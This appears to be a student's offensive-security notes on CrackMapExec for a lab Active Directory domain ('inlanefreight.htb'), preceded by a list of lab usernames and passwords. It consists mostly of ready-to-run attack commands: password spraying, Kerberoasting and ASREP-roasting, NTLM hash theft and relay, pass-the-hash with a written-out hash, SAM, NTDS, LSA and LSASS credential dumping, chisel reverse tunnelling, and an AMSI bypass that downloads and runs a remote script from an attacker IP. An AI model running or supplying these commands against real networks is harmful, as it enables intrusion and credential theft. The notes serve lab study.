PWD
Guest
carlos Inlanefreight02!
grace Inlanefreight01!
peter
alina HRApp123!
noemi
engels Inlanefreight1998!
kiosko SimplePassword123!
testaccount Testing123!
mathew 
svc_mssql
gmsa_adm
belkis
nicole Inlanefreight02!
jorge
linda Password123
shaun
diana HackingGPPlike4Pro
patrick
elieser
robert Inlanefreight01!
elieser Passw0rd
julio Password1
# CrackMapExec
## Latest
- https://github.com/Pennyw0rth/NetExec

## Ways to run
- On Linux with Poetry
- On Linux with Docker
- On Windows, Linux, MacOS using embedded Python and binary


## Scanning Targets and Protocols
- Target Format
	- CIDR
	- IP
	- hostname
	- filename with IP the range, hostnames
- Supported Protocols
	- 445 SMB
	- 5985/5986 WINRM
	- 1433 MSSQL
	- 389 LDAP
	- 22 SSH
	- 3389 RDP
	- 21 FTP

## Gathering Information Anonymously
- Basic SMB Enumeration
	- crackmapexec smb 192.168.133.0/2
- Getting all Hosts with SMB Signing Disabled
	- crackmapexec smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
- Exploiting NULL/Anonymous Sessions
	- crackmapexec smb 10.129.203.121 -u '' -p '' --users
	- crackmapexec smb 10.129.203.121 -u '' -p '' --groups
	- crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol
	- crackmapexec smb 10.129.203.121 -u '' -p '' --shares
- Enumerating Users with rid bruteforce
	- (up to 4000 by default) but can be modified with --rid-brute [MAX_RID]
	- crackmapexec smb 10.129.204.172  -u '' -p '' --rid-brute
- Making Userlist
	- crackmapexec smb 10.129.203.121 -u '' -p '' --users --export ~/Desktop/userlist

## Password Spraying with CME
- Ways to obtain valid usernames
	- Abusing NULL Session flaw
	- OSINT
	- Brute-forcing with large username list + Kerbrute
	- Physical recon
- Creating Password List
- Spraying 
	- crackmapexec smb 10.129.204.177 -u userlist.txt -p Inlanefreight01!
	- crackmapexec smb 10.129.204.177 -u userlist.txt -p Inlanefreight01! --continue-on-success
	- crackmapexec smb 10.129.204.177 -u userlist.txt -p Inlanefreight01! Inlanefreight02!
	- crackmapexec smb 10.129.204.177 -u userlist.txt -p passwords.txt
	- crackmapexec smb 10.129.204.177 -u Administrator -p Password@123 --local-auth
- Account Status
	- Green - valid
	- Red - invalid
	- Magenta - username and password are valid, but auth not successful
- Authentication not successful workaround
	- STATUS_ACCOUNT_DISABLED
	- STATUS_ACCOUNT_EXPIRED
	- STATUS_ACCOUNT_RESTRICTION
	- STATUS_INVALID_LOGON_HOURS
		- try another time
	- STATUS_INVALID_WORKSTATION
	- STATUS_LOGON_TYPE_NOT_GRANTED
	- STATUS_PASSWORD_EXPIRED
	- STATUS_PASSWORD_MUST_CHANGE
		- change password with 'smbpasswd -r domain -U user'
	- STATUS_ACCESS_DENIED
## Features
- Exporting results
	- crackmapexec smb 10.10.10.1 [protocol options] --export $(pwd)/export.txt
- Protocol Modules
	- crackmapexec < protocol > -L
- Creating 

## Targeting WinRM
- Enabled by default on
	- Windows Server 2012 R2 / 2016 / 2019
	- ports TCP/5985 (HTTP) and TCP/5986 (HTTPS)
- Pre-requisites
	- Local administrator privileges
	- Member of Remote Management Users group
	- or have explicit permissions for PS Remoting in session config
- WinRM - Password Spraying
	- crackmapexec winrm 10.129.204.177 -u guessed.txt -p val_passwd.txt --no-bruteforce --continue-on-success
	- crackmapexec winrm 10.129.204.177 -u guessed.txt -p val_passwd.txt --continue-on-success
- LDAP - Password Spraying
	- Tune to use FQDN
		- Way 1: Configure attack host to use DNS
		- Way 2: Configure KDC FQDN in our /etc/hosts
	- Spraying
		- crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p Inlanefreight01!
- MSSQL - Password Spray
	- Authentication Modes
		- Windows authentication mode - default
		- Mixed mode - by Windows/AD accounts and SQL Server
	- Users that can authenticate
		- AD Account
			- crackmapexec mssql 10.129.204.177 -u julio grace jorge -p Inlanefreight01!
		- Local Windows Account (not on domain controller)
			- crackmapexec mssql 10.129.204.177 -u julio grace jorge -p Inlanefreight01! -d .
		- SQL Account
			- crackmapexec mssql 10.129.204.177 -u julio grace jorge -p Inlanefreight01! --local-auth 

## Finding ASREPRoastable Accounts
- Origin
	- attack looks for users without Kerberos pre-authentication required
	- anyone can send an AS_REQ request to the KDC on behalf of any of those users and receive AS_REP message
	- AS_REP message contains a chunk of data encrypted with the original key derived from its password
	- the user password could be cracked offline if user chose a relatively weak password
- Bruteforcing
	- unathenticated - 'crackmapexec ldap dc01.inlanefreight.htb -u userlist.txt -p '' --asreproast asreproast.out'
	- authenticated - 'crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --asreproast asreproast.out'

## Gathering Information with an Account
## Searching for Accounts in Group Policy Objects
- gpp_password
	- retrieves the plaintext password and other information for accounts pushed through GPP
	- Group Policy Preferences
	- crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! -M gpp_password
- gpp_autologin
	- searches the DC for registry.xml files to find autologin information
	- returns username and cleartext password if present
	- crackmapexec smb 10.129.204.177 -u robert -p Inlanefreight01! -M gpp_autologin

## Working with Modules
- Listing modules and options
	- crackmapexec ldap -L
	- crackmapexec ldap -M MAQ --options
- Retrieve User Description with user-desc
	- logs are stored at "~/username/.cme/logs/filename.log"
	- crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc 
- Using module options (KEY=value)
	- keywords are stored at "/usr/lib/python3/dist-packages/cme/modules/ ""
	- crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=pwd,admin

## MSSQL Enumeration and Attacks
- Execute SQL Queries
	- crackmapexec mssql 10.129.204.177 -u grace -p Inlanefreight01! -q "SELECT name FROM master.dbo.sysdatabases"
	- crackmapexec mssql 10.129.204.177 -u nicole -p Inlanefreight02! --local-auth -q "SELECT name FROM master.dbo.sysdatabases" 
- Execute Windows Commands
	- If we notice the output Pwn3d!, the user is a Database Administrator or DBA.
	- A DBA account has the privileges to enable the features needed to execute Windows operating system commands.
	- crackmapexec mssql 10.129.204.177 -u nicole -p Inlanefreight02! --local-auth -x whoami
- Transfering Files via MSSQL
	- crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --put-file /etc/passwd C:/Users/Public/passwd
	- crackmapexec mssql 10.129.204.177 -u nicole -p Inlanefreight02! --local-auth --get-file C:/Windows/System32/drivers/etc/hosts hosts
- SQL Privilege Escalation Module
	- Vectors of mssql_priv
		- EXECUTE AS LOGIN
		- db_owner role
	- Options of mssql_priv
		- enum_privs to list privileges (default) 
		- privesc to escalate privileges
		- and rollback to return the user to its original state
	- In action
		- --no-bruteforce and --continue-on-success does not support a module with multiple accounts at the same time. 
		- crackmapexec mssql 10.129.204.177 -u robert -p Inlanefreight01! -M mssql_priv
		- crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
## Finding Kerberoastable Accounts
- What is Kerberoasting attack?
	- aims to harvest TGS Tickets with a user with SPN values, typically a service account
	- any valid AD account can request TGS for any SPN account
	- part of the ticket is encrypted with the account's NTLM hash, can be cracked offline
- Kerberoasting
	- crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out
	- verifying access "crackmapexec smb 10.129.204.177 -u elieser -p Passw0rd"

## SMB Spidering
- crackmapexec smb 10.129.204.177 -u val_users -p Inlanefreight01! --shares
- spider
	- files containing "txt" "crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT --pattern txt"
	- list all files in IT directory "crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT --regex ."
	- contents "crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT --content --regex Encrypt"
- File transfers
	 - retrieve a file "crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --share IT --get-file Creds.txt Creds.txt" **c:\relay\flag.txt**
	 - copy a single file "crackmapexec smb IP -u u -p '' --local-auth --share C$ --get-file 'Users\Administrator\Desktop\julio_keys' jkey"
	 - send a file "crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --share IT --put-file /etc/passwd passwd"
	 - upload a file "crackmapexec smb 10.129.204.146 -u Administrator -p 'IpreferanewP@' --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe --local-auth"
	 - if you keep getting an error, try adding the option --smb-timeout with a value greater than the default two (2)
- spider_plus
	- by default create a folder /tmp/cme_spider_plus and a JSON file IP.json containing the share and files information
	- use the module option EXCLUDE_DIR to prevent the tool from looking at shares like IPC$,NETLOGON,SYSVOL, etc
	- crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
	- to download all  "crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false"

## Proxychains with CME
- Set Up the Tunnel
	- setup server on the attacker host "./chisel server -p 8001 --reverse"
	- upload chisel to target "crackmapexec smb 10.129.204.178 -u grace -p Inlanefreight01! --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe "
	- connect chisel to server "crackmapexec smb 10.129.204.178 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.15.169:8001 R:socks""
	- test "proxychains crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares"
	- teminating "crackmapexec smb 10.129.204.177 -u julio -p Password1 -X "Stop-Process -Name chisel -Force""
- Tips
	- configure proxychains to default port TCP 1080 "/etc/proxychains.conf"
	- confirm that tunnel is established "netstat -lnpt | grep 1080"
	- quiet mode "proxychains -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares"
- Windows as a Server and Linux as a Client
	- crackmapexec smb 10.129.204.177 -u julio -p Password1 -x "C:\Windows\Temp\chisel.exe server --socks5"
	- as linux client "sudo ./chisel 10.129.204.177:8080 socks ""

## Stealing Hashes
- how does it work?
	- widespread way is by forcing a computer or user to initiate an authentication with a fake shared folder we control
	- victim starts it with a NTLMv2 hash, could be cracked or used for impersonation without cracking
	- we can create a shortcut and configure it so the icon that appears in the shortcut points to our fake shared folder
- using Slinky Module
	- the module has two mandatory options, SERVER and NAME, and one optional CLEANUP.
	- find a share where user has WRITE privileges with option --shares
	- using "proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o SERVER=10.10.15.169 NAME=important"
	- enable responder with SMB option ON
	-  cleanup "proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o NAME=important CLEANUP=YES"
- NTLM Relay
	- can be used on the network where SMB Signing is disabled
	- generating a list "proxychains4 -q crackmapexec smb 172.16.1.0/24 --gen-relay-list relay.txt"
- NTLMRelayX
	- will automatically dump the SAM db of the target
	- would be able to PtH attack with any local admin user hashes
	- performing relay "sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http"
	- PtH with obtained a fresh hash " proxychains4 -q crackmapexec smb 172.16.1.5 -u administrator -H 30b3783ce2abf1af70f77d0660cf3453 --local-auth"
- Options of drop-sc 
	- using .searchConnector-ms and .library-ms format rather than LNK
	- the option URL to target our SMB fake server
	- the option SHARE=name to speficy output, otherwise it will write the file to all shares with WRITE permission
	- the option FILENAME=name, by default "Documents"
	- the option CLEANUP=True if we want to clean the files we created
- Stealing Hashes with drop-sc Module
	- proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o URL=\\\\10.10.15.169\\secret SHARE=IT-Tools FILENAME=secret
	- generating a list "proxychains4 -q crackmapexec smb 172.16.1.0/24 --gen-relay-list relay.txt"
	- relaying "sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http"
	- cleanup "proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o CLEANUP=True FILENAME=secret"

## Mapping and Enumeration with Administrator Account
- crackmapexec smb target -u user -p p --disks
- crackmapexec smb target -u user -p p --computers
- crackmapexec smb target -u user -p p --wmi query
- crackmapexec smb target -u user -p p --wmi-namespace
- crackmapexec smb target -u user -p p --rid-brute

- crackmapexec smb target -u user -p p --shares
- crackmapexec smb target -u user -p p --users

- crackmapexec smb target -u user -p p --pass-pol
- loggedon-users options
	- crackmapexec smb target -u user -p p --loggedon-users
	- crackmapexec smb target -u user -p p --loggedon-users --loggedon-users-filter username
	- crackmapexec smb target -u user -p p --sessions
- enumerate LAPS
	- LAPS provides management of local account passwords of domain-joined computers.
	- If the default administrator account name is not "administrator," add the username after the option --laps username.
	- ldap LAPS "crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! -M laps"
	- dump LAPS "crackmapexec smb /tmp/hosts -u robert -p Inlanefreight01! --laps"
	- dump LAPS + SAM "crackmapexec smb /tmp/hosts -u robert -p Inlanefreight01! --laps --sam":
- Enumeration by RID Brute-forcing --rid-brute
	- By default brute forcing RIDs up to 4000, we can modify  --rid-brute [MAX_RID].
	- can also be used to retrieve user names and other AD objects that match brute-forced IDs
	- enumerate domain accounts if NULL Authentication is Enabled
	- crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --rid-brute
- Enumerating Groups
	- crackmapexec smb target -u user -p p --local-groups
	- crackmapexec smb target -u user -p p --groups
	- to enum members "crackmapexec smb target -u user -p p --groups Administrators"
- Querying WMI
	- WMI is used for administrative operations on Windows operating systems
	- one of the primary use of WMI is the ability to query the WMI repository for class and instance information
	- commonly, to query WMI, we will need to have administrative privileges, but an administrator can configure a non-administrator account to query WMI
	- crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --wmi "SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'"
	- crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --wmi "SELECT * FROM MSPower_DeviceEnable" --wmi-namespace "root\WMI"

## LDAP and RDP Enumeration
- crackmapexec ldap target -u u -p p --users
- crackmapexec ldap target -u u -p p --groups
- crackmapexec ldap target -u u -p p --password-not-required
- crackmapexec ldap target -u u -p p --trusted-for-delegation
- crackmapexec ldap target -u u -p p --admin-count
- crackmapexec ldap target -u u -p p --get-sid
- crackmapexec ldap target -u u -p p --gmsa
- crackmapexec rdp target -u u -p p --nla-screenshot
- crackmapexec rdp target -u u -p p --screenshot
- crackmapexec rdp target -u u -p p --screentime SCREENTIME
- crackmapexec rdp target -u u -p p --res RES
- enumerating users and groups
	- note that we are not connecting to the domain DNS servers, we need to configure the FQDN in the /etc/hosts file.
	- crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --users --groups
	- crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --password-not-required
- Identifying Unconstrained Delegation
	- service account (user or computer) under which a service runs can impersonate a client requesting the service. 
	- crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --trusted-for-delegation
- Identifying adminCount
	- attribute determines whether or not the SDProp process protects a user
	- adminCount 0 - not protected, 1 - protected
	- these are often privileged accounts and may lead to further access or full domain compromise.
	- crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --admin-count
- Enumerating the Domain SID
	- used for different attacks
	- crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! --get-sid
- gMSA
	- is a managed domain account that provides the following:
	    - Automatic password management.
	    - Simplified service principal name (SPN) management.
	    - The ability to delegate the management to other administrators.
	- to list "crackmapexec winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword""
	- to retrieve hash "crackmapexec ldap dc01.inlanefreight.htb -u engels -p Inlanefreight1998! --gmsa"
- RDP Screenshots
	- to take a screenshot of logon prompt "crackmapexec rdp 10.129.204.177 --nla-screenshot"
	- if we have creds "crackmapexec rdp 10.129.204.177 -u julio -p Password1 --screenshot --screentime 5 --res 1280x720"

## Command Execution
- check for the presence of UAC before attempting to execute a command as a local administrator on a remote target
- LocalAccountTokenFilterPolicy
	- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
	- only applies to local accounts, domain user can execute even if UAC is set
	- if equal to 0 only the built-in administrator account (RID 500) can perform administration tasks
	- if equal 1 all admin accounts can execute administrative tasks
- FilterAdministratorToken
	- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken
	- if equal to 1 built-in admin account cannot perform remote administrative tasks
- Executing
	- crackmapexec smb 10.129.204.133 -u Administrator -p AnotherC0mpl3xP4 --local-auth -x "net localgroup administrators"
	- when executing command as localadmin and not getting (Pwn3d!) it means that UAC is enabled
	- crackmapexec smb 10.129.204.133 -u Administrator -p 'AnotherC0mpl3xP4' --local-auth -x "reg add HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
- Command Execution with SMB
	- wmiexec
		- executes commands via WMI (file written on disk)
		- PS exec "crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --exec-method wmiexec -X '$PSVersionTable' "
	- atexec
		- executes commands by scheduling a task with the windows task scheduler
		- fileless, not working on the latest version of Windows
	- smbexec
		- executes commands by creating and running a service (fileless, not working on the latest version of Windows)
		- crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --exec-method smbexec -x whoami
	- mmcexec
		-  is similar to the wmiexec method, but the commands are executed through the Microsoft Management Console (MMC).
- AMSI Bypass
	- -X option does the following
		- AMSI bypass
		- Obfuscate the payload
		- Execute the payload
	- Custom AMSI Bypass
		- download bypass wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/shantanukhande-amsi.ps1 -q
		- create script "echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.33/shantanukhande-amsi.ps1');" > amsibypass.txt"
		- host script using python server "sudo python3 -m http.server 80"
		- crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -X '$PSVersionTable' --amsi-bypass amsibypass.txt
- Command Execution Using WinRM
	- we can use the WinRM protocol if 
		- we are members of the Administrators group
		- we are members of the Remote Management Users group
		- we have explicit PowerShell Remoting permissions in the session configuration
		- it does not require a user to be an administrator to execute commands
	- action
		- crackmapexec winrm 10.129.204.133 -u robert -p 'Inlanefreight01!' -x whoami
		- crackmapexec winrm 10.129.204.133 -u robert -p 'Inlanefreight01!' -X '$PSVersionTable'
	- options
		- select port for WinRM connection --port PORT 
		- connect to SSL enabled WinRM --ssl
		- ignore cert verification when connecting to ssl --ignore-ssl-cert
- SSH Command Execution
	- crackmapexec ssh 10.129.204.133 -u robert -p 'Inlanefreight01!' -x ipconfig
	- using private/public keys "crackmapexec ssh 10.129.204.133 -u julio --key-file id_ed25519 -p "" -x whoami"
## Finding Secrets and Using Them
- SAM
	- contains credentials for all local users
	- crackmapexec smb 10.129.204.178 -u robert -p 'Inlanefreight01!' --sam
	- crackmapexec winrm 10.129.204.178 -u robert -p 'Inlanefreight01!' --sam
- NTDS
	- AD database, domain admin or any user with replication/DCSync privileges
	- proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p 'Inlanefreight01!' --ntds
	- single "proxychains4 -q crackmapexec smb 172.16.1.10 -u julio -p Password1 --ntds --user krbtgt"
	- enabled only "proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p 'Inlanefreight01!' --ntds --enabled"
- LSA
	- dumps LSA secrets, including cached credentials, local machine key list, service creds, DPAPI keys
	- domain cached credential hashes cannot be used for a PtH attack
	- crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --lsa
- Gettings Secrets from LSASS
	- contains Windows passwords as cleartext or other formats of hashes such as NTLM or AES256/AES128. 
	- Lsassy Module "crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M lsassy"
	- Procdump Module "crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M procdump"
	- HandleKatz Module "crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M handlekatz"
	- Nanodump Module "crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M nanodump"

## Getting Sessions in a C2 Framework
- Empire
- Metasploit
..to be continue

## Bloodhound Integration
- Marked as owned
	- modify the CrackMapExec configuration file located in ~/.cme/cme.conf
	- upload "crackmapexec smb 10.129.204.177 -u julio -p Password1 --share C$ --put-file SharpHound.exe SharpHound.exe "
	- execute "crackmapexec smb 10.129.204.177 -u julio -p Password1 -x "C:\SharpHound.exe -c All && dir c:\*_BloodHound.zip""
	- download "crackmapexec smb 10.129.204.177 -u julio -p Password1 --get-file 20240821154907_BloodHound.zip 20240821154907_BloodHound.zip"
	- download "crackmapexec smb 10.129.204.177 -u julio -p Password1 --get-file 20240821155836_BloodHound.zip 20240821155836_BloodHound.zip"
	- bh_owned module "crackmapexec smb 10.129.203.121 -u julio -p Password1 -M bh_owned -o PASS=HackTheBoxCME!"

## Popular Modules
- LDAP Module - get-network
	- based on adidnsdump
	- by default any user in AD can enumerate all DNS records in the Domain or Forest DNS zones
	- crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M get-network -o ALL=true
- LDAP Module - laps
	- With the laps module, we can retrieve all computers an account has access to read
	- crackmapexec ldap dc01.inlanefreight.htb -u robert -p Inlanefreight01! -M laps --options
- LDAP Module - MAQ
	- indicates the number of computer accounts that a user is allowed to create in a domain
	- few attacks such as Resource Based Constrained Delegation that requires us to create a machine in the domain
- LDAP Module - daclread
	- read and export the DACLs of one or multiple objects
	- crackmapexec ldap dc01.inlanefreight.htb -u '' -p '' -M daclread -o TARGET=grace ACTION=read
	- search for DACL "crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync"
- SMB Modules - get_netconnections and ioxidresolver
	- to see if machine has more then one network configuration
	- crackmapexec smb 10.129.204.177 -u julio -p Password1 -M get_netconnections
	- crackmapexec smb 10.129.204.177 -u julio -p Password1 -M ioxidresolver
- SMB Module - keepass_discover
	- password manager commonly used in enterprise networks by admins and users to store passwords and secrets in one database
	- locate keypass "crackmapexec smb 10.129.204.177 -u julio -p Password1 -M keepass_discover"
	- crackmapexec smb 10.129.204.177 -u julio -p Password1 -M keepass_trigger -o ACTION=ADD KEEPASS_CONFIG_PATH=C:\Users\david\AppData\Roaming\KeePass\KeePass.config.xml
	- crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml
- Enabling RDP
	- crackmapexec smb 10.129.204.177 -u julio -p Password1 -M rdp --options
	- crackmapexec smb 10.129.204.177 -u julio -p Password1 -M rdp -o ACTION=enable

## Vulnerability Scan Modules
domain 172.16.10.3